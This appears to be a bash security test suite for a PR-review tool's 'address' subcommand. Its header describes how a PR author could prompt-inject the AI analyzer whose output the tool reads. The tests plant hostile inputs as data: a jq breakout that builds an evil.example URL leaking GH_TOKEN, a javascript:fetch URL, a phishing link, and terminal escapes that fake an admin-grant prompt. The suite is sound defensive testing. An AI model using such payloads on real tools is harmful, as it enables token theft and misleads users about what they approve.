#!/bin/bash
# Security tests for the `address` subcommand.
#
# claude-analysis.json is analyzer output, and the analyzer reads PR content. A
# PR author who prompt-injects the analyzer controls the strings in that file, so
# every value taken from it must be treated as hostile — particularly the thread
# ids, which reach a jq program and then a browser.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
GH_PR_ENRICH="$PROJECT_DIR/gh-pr-enrich"
TEST_OUTPUT_DIR="$SCRIPT_DIR/test-output/address-security"
STUB_DIR="$TEST_OUTPUT_DIR/stubs"
OPENED_LOG="$TEST_OUTPUT_DIR/opened-urls.txt"

# shellcheck source=lib/assert.sh
source "$SCRIPT_DIR/lib/assert.sh"

cleanup() { rm -rf "$TEST_OUTPUT_DIR"; }
trap cleanup EXIT
cleanup
mkdir -p "$STUB_DIR"

suite_start "gh pr-enrich address security suite"

# Stub the browser openers so a test can never launch one, and record what would
# have been opened.
for opener in open xdg-open; do
    cat > "$STUB_DIR/$opener" << 'STUB'
#!/bin/bash
printf '%s\n' "$1" >> "$OPENED_URLS_LOG"
STUB
    chmod +x "$STUB_DIR/$opener"
done

# Build a workspace with a hostile analysis file and run `address` in it.
# $1 = thread id planted in claude-analysis.json
# $2 = url planted in comment-threads.json for the benign id
run_address() {
    local thread_id="$1"
    local planted_url="${2:-https://github.com/o/r/pull/999#discussion_r1}"
    local ws="$TEST_OUTPUT_DIR/ws"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    : > "$OPENED_LOG"

    jq -n --arg tid "$thread_id" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [],
        task_list: [{
            priority: "high", task: "Task under test", thread_ids: [$tid],
            file: "a.js", line: 1, suggested_fix: "fix", verification: "npm test"
        }],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"

    jq -n --arg url "$planted_url" '{
        data: {repository: {pullRequest: {reviewThreads: {nodes: [
            {id: "PRRT_benign", isResolved: false,
             comments: {nodes: [{url: $url}]}}
        ]}}}}
    }' > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    # "o" opens the thread, "q" quits the loop.
    printf 'oq' | (cd "$ws" && env OPENED_URLS_LOG="$OPENED_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true
}

# ---------------------------------------------------------------------------
# jq program-string breakout
#
# The id closes the interpolated string literal and supplies its own program,
# synthesizing a URL of the attacker's choosing (and jq can read $ENV, so the
# same hole leaks environment variables).
# ---------------------------------------------------------------------------
EXFIL='x") | ("https://evil.example/?leak=" + ($ENV.GH_TOKEN // "none")) // ("'
OUT=$(run_address "$EXFIL")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")

assert_not_contains "$OPENED" "evil.example" "a jq-breakout thread id cannot open an attacker URL"
assert_not_contains "$OPENED" "GH_TOKEN" "environment variables cannot be exfiltrated through the URL"
assert_contains "$OUT" "thread ID" "the malformed thread id is reported to the user"

# A plain quote is enough to corrupt the program even without a payload.
OUT=$(run_address 'PRRT_abc" or "1"=="1')
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a quoted thread id opens nothing"

# ---------------------------------------------------------------------------
# The feature still works for a legitimate id
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_contains "$OPENED" "https://github.com/o/r/pull/999#discussion_r1" \
    "a valid thread id still opens its comment URL"

# ---------------------------------------------------------------------------
# The URL itself is checked before it reaches the opener
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign" "javascript:fetch('https://evil.example')")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a non-https URL is never handed to the browser"

OUT=$(run_address "PRRT_benign" "https://evil.example/phish")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a URL outside GitHub is never handed to the browser"

# ---------------------------------------------------------------------------
# Terminal escape sequences in analyzer output
#
# Task text is printed straight to the user's terminal. Escape sequences there
# can repaint the screen, hide text, or fake the tool's own prompts — so an
# injected analysis could misrepresent what the user is approving.
# ---------------------------------------------------------------------------
run_address_with_task() {
    local task_json="$1"
    local ws="$TEST_OUTPUT_DIR/ws-term"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    jq -n --argjson task "$task_json" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [], task_list: [$task],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    echo '{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[]}}}}}' \
        > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    printf 'q' | (cd "$ws" && env PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true
}

#  is a real escape byte once jq -r decodes it.
HOSTILE_TASK=$(jq -n '{
    priority: "high[2J[H",
    task: "Harmless looking[31m FAKE PROMPT: [y]es to grant admin",
    thread_ids: [],
    file: "a.js", line: 1,
    suggested_fix: "fix[1;32m",
    verification: "npm test[0m"
}')

TERM_OUT=$(run_address_with_task "$HOSTILE_TASK")

# The payload's printable remainder ("[2J") is harmless; what matters is that no
# ESC byte survives to be interpreted by the terminal.
if printf '%s' "$TERM_OUT" | grep -q $'\033\\[2J'; then
    fail "screen-clearing escape from analyzer output is neutralized" "a raw ESC[2J reached the terminal"
else
    pass "screen-clearing escape from analyzer output is neutralized"
fi

if printf '%s' "$TERM_OUT" | grep -q $'\033\\[31m FAKE PROMPT'; then
    fail "color escapes in task text are neutralized" "a raw ESC[31m reached the terminal"
else
    pass "color escapes in task text are neutralized"
fi

assert_contains "$TERM_OUT" "FAKE PROMPT" "the task text itself is still shown to the user"

suite_end
